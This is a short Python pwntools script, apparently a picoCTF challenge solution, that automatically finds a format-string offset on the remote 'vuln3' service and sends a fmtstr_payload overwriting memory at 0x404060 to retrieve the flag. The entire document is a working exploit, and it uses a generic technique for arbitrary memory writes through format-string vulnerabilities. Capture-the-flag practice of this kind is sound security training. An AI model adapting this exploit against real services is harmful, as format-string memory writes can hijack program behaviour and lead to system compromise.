from pwn import *

context.log_level = "critical"
context.binary = ELF('./vuln3')

p = remote('rhea.picoctf.net', 64986)

def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 64986)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
print(offset)
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print("Flag: ", flag)